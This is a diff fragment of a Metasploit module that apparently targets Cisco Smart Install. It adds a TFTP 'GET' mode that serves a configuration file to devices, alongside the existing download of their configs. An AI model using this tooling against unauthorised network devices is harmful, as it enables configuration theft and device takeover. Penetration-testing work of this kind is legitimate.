@@ -48,13 +48,21 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def start_tftp
+  def start_tftp(req_type)
+    # http://rapid7.github.io/metasploit-framework/api/Rex/Proto/TFTP/Server.html
     print_status("Starting TFTP Server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
-    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
-    @tftp.start
+    case
+      when req_type == "PUT"
+        @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+        @tftp.start
+      when req_type == "GET" # yeah yeah, so original. lmao.
+        # read global variables data, and size
+        config_exec_data = @config_exec.read(@config_exec.stat.size)
+        @tftp.register_file("#{Rex::Text.rand_text_alpha}.conf", config_exec_data)
+        @tftp.start
+    end
     add_socket(@tftp.sock)
-
     @main_thread = ::Thread.current
   end
 
@@ -131,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
           connect
           return unless smi?
         when action.name == 'DOWNLOAD'
-          start_tftp
+          start_tftp("PUT")
           connect
           return unless smi?
           print_status("Waiting #{datastore['DELAY']} seconds before requesting config")
